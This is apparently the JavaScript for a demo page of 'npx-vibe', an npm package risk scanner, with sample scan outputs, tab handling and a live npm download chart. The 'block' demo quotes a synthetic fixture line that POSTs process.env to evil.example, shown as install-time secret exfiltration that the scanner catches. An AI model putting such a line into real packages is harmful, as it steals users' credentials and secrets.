const demos = {
  proceed: `$ npx npx-vibe --check is-number
✓ npx-vibe: Proceed  risk 0/100
is-number@7.0.0
Returns true if a number or string value is a finite number.

Downloads: 171,615,366/week  Package age: 4293d  Version age: 2911d
Install hooks: none
Inspected: 1 selected file from 4 package files
Established signals: long registry history, high weekly adoption,
multiple maintainers, linked GitHub repository
Registry popularity and age provide context, but never override code findings.
Review memory: first local scan of this package integrity.
AI review: skipped (No heuristic trigger required model review.)

Action: package may be executed.`,
  caution: `$ npx npx-vibe --check esbuild
! npx-vibe: Caution  risk 43/100
esbuild@0.28.1
An extremely fast JavaScript and CSS bundler and minifier.

Downloads: 241,858,907/week  Package age: 3132d  Version age: 12d
Install hooks: postinstall
Inspected: 3 selected files from 7 package files
Established signals: long registry history, high weekly adoption,
linked GitHub repository
Review memory: unchanged tarball since 2026-06-25; previous Caution 43/100.
AI review: skipped (Heuristic-only mode; AI was not requested.)

Findings:
- LOW      young_version
  This version was published 12 days ago.
- MEDIUM   lifecycle_hook in package.json
  postinstall runs: node install.js
  Evidence: postinstall: node install.js
- MEDIUM   network_and_shell in install.js
  Code combines network access with shell execution.
  Evidence line 147: function fetch(url) { ... https.get(url ...
  Evidence line 187: child_process.execSync(\`npm install ...\`)

Action: review recommended before execution.`,
  ai: `$ npx npx-vibe --check --ai online \\
  --provider gemini --model-profile balanced esbuild
! npx-vibe: Caution  risk 43/100
esbuild@0.28.1

Install hooks: postinstall
Inspected: 3 selected files from 7 package files
Review memory: unchanged tarball since 2026-06-25; previous Caution 43/100.
AI review: Gemini gemini-3.5-flash [balanced] (high confidence)
AI evidence: 0 source-backed findings

Findings:
- MEDIUM   lifecycle_hook in package.json
  postinstall runs: node install.js
- MEDIUM   network_and_shell in install.js
  Code combines network access with shell execution.

AI interpretation: The selected install script appears to resolve a
platform-specific binary. No additional source-backed credential access,
obfuscation, or persistence finding was identified, but the deterministic
install-time network and process evidence remains.

Action: review recommended before execution.`,
  block: `# Synthetic malicious fixture from the npx-vibe test suite
✕ npx-vibe: Block  risk 100/100
fixture: install-time secret exfiltration

Install hooks: postinstall
AI review: skipped (Heuristic-only mode; AI was not requested.)

Findings:
- CRITICAL possible_secret_exfiltration in postinstall.js
  Code appears to access environment/secrets and perform network activity.
  Evidence line 1: fetch('https://evil.example/collect',
  { method: 'POST', body: JSON.stringify(process.env) })

Action: blocked unless --force is supplied.`
};

const demoMeta = {
  proceed: {
    label: "deterministic · real package",
    note: "Real heuristic-only output. No API key, model, or package execution is involved.",
  },
  caution: {
    label: "deterministic · real package",
    note: "Real heuristic-only output. Popularity is context; install-time behavior still receives Caution.",
  },
  ai: {
    label: "optional AI · real Gemini run",
    note: "Adapted from a successful Gemini 3.5 Flash review on June 25, 2026 to reflect the 1.2 source-evidence rules. Model wording varies; deterministic evidence remains authoritative.",
  },
  block: {
    label: "deterministic · synthetic fixture",
    note: "Synthetic malicious fixture from the test suite—not a claim about a public npm package.",
  },
};

const output = document.querySelector("#demo-output");
const demoLabel = document.querySelector("#demo-label");
const demoNote = document.querySelector("#demo-note");
const tabs = document.querySelectorAll(".demo-tab");

function setDemo(name) {
  if (!output || !demos[name]) return;
  output.textContent = demos[name];
  if (demoLabel) demoLabel.textContent = demoMeta[name].label;
  if (demoNote) demoNote.textContent = demoMeta[name].note;
  tabs.forEach((tab) => {
    const active = tab.dataset.demo === name;
    tab.classList.toggle("active", active);
    tab.setAttribute("aria-selected", String(active));
  });
}

tabs.forEach((tab) => {
  tab.addEventListener("click", () => setDemo(tab.dataset.demo));
});

setDemo("proceed");

document.querySelectorAll("[data-copy]").forEach((copyButton) => {
  const defaultText = copyButton.textContent;

  copyButton.addEventListener("click", async () => {
    try {
      await navigator.clipboard.writeText(copyButton.dataset.copy);
      copyButton.textContent = "Copied";
    } catch {
      copyButton.textContent = "Copy failed";
    }

    setTimeout(() => {
      copyButton.textContent = defaultText;
    }, 1300);
  });
});

const DOWNLOAD_API = "https://api.npmjs.org/downloads/range/last-week/npx-vibe";
const numberFormatter = new Intl.NumberFormat("en-US");
const compactFormatter = new Intl.NumberFormat("en-US", { notation: "compact", maximumFractionDigits: 1 });
const dateFormatter = new Intl.DateTimeFormat("en-US", { month: "short", day: "numeric", timeZone: "UTC" });

async function loadDownloadMomentum() {
  const status = document.querySelector("[data-download-status]");
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 8_000);

  try {
    const response = await fetch(DOWNLOAD_API, {
      headers: { accept: "application/json" },
      signal: controller.signal,
    });
    if (!response.ok) throw new Error(`npm API returned ${response.status}`);

    const payload = await response.json();
    const days = Array.isArray(payload.downloads) ? payload.downloads.slice(-7) : [];
    if (!days.length) throw new Error("npm API returned no daily data");

    const total = days.reduce((sum, day) => sum + Number(day.downloads || 0), 0);
    document.querySelectorAll("[data-weekly-downloads]").forEach((element) => {
      animateNumber(element, total);
      element.setAttribute("title", `${numberFormatter.format(total)} downloads from ${payload.start} through ${payload.end}`);
    });

    const windowText = formatDateWindow(payload.start, payload.end);
    document.querySelectorAll("[data-download-window]").forEach((element) => {
      element.textContent = windowText;
    });

    renderDownloadChart(days);
    if (status) {
      status.textContent = `npm API · ${compactFormatter.format(total)} total`;
    }
  } catch (error) {
    if (status) status.textContent = "Live API unavailable · showing last known value";
    document.querySelector("[data-download-dashboard]")?.classList.add("is-stale");
    console.warn("Could not refresh npm download count:", error.message);
  } finally {
    clearTimeout(timeout);
  }
}

function animateNumber(element, target) {
  const start = Number(String(element.textContent).replace(/,/g, "")) || 0;
  if (window.matchMedia("(prefers-reduced-motion: reduce)").matches || start === target) {
    element.textContent = numberFormatter.format(target);
    return;
  }

  const startedAt = performance.now();
  const duration = 750;
  const tick = (now) => {
    const progress = Math.min(1, (now - startedAt) / duration);
    const eased = 1 - Math.pow(1 - progress, 3);
    element.textContent = numberFormatter.format(Math.round(start + (target - start) * eased));
    if (progress < 1) requestAnimationFrame(tick);
  };
  requestAnimationFrame(tick);
}

function renderDownloadChart(days) {
  const line = document.querySelector("[data-chart-line]");
  const area = document.querySelector("[data-chart-area]");
  const pointsLayer = document.querySelector("[data-chart-points]");
  const labels = document.querySelector("[data-chart-labels]");
  if (!line || !area || !pointsLayer || !labels) return;

  const width = 520;
  const left = 20;
  const top = 28;
  const bottom = 155;
  const max = Math.max(...days.map((day) => Number(day.downloads || 0)), 1);
  const points = days.map((day, index) => {
    const x = left + (width / Math.max(days.length - 1, 1)) * index;
    const y = bottom - (Number(day.downloads || 0) / max) * (bottom - top);
    return { x, y, day };
  });

  line.setAttribute("points", points.map(({ x, y }) => `${x.toFixed(1)},${y.toFixed(1)}`).join(" "));
  area.setAttribute("d", `M${left} ${bottom} L${points.map(({ x, y }) => `${x.toFixed(1)} ${y.toFixed(1)}`).join(" L")} L${left + width} ${bottom} Z`);

  pointsLayer.replaceChildren();
  const svgNamespace = "http://www.w3.org/2000/svg";
  points.forEach(({ x, y, day }) => {
    const circle = document.createElementNS(svgNamespace, "circle");
    circle.setAttribute("cx", x.toFixed(1));
    circle.setAttribute("cy", y.toFixed(1));
    circle.setAttribute("r", "5");
    const title = document.createElementNS(svgNamespace, "title");
    title.textContent = `${day.day}: ${numberFormatter.format(day.downloads)} downloads`;
    circle.append(title);
    pointsLayer.append(circle);
  });

  labels.replaceChildren(...days.map((day) => {
    const label = document.createElement("span");
    label.textContent = dateFormatter.format(new Date(`${day.day}T00:00:00Z`));
    return label;
  }));
}

function formatDateWindow(start, end) {
  const startDate = new Date(`${start}T00:00:00Z`);
  const endDate = new Date(`${end}T00:00:00Z`);
  return `${dateFormatter.format(startDate)}–${dateFormatter.format(endDate)}, ${endDate.getUTCFullYear()}`;
}

loadDownloadMomentum();

const observer = new IntersectionObserver(
  (entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        entry.target.classList.add("visible");
        observer.unobserve(entry.target);
      }
    });
  },
  { threshold: 0.14 }
);

document.querySelectorAll(".reveal").forEach((element) => observer.observe(element));
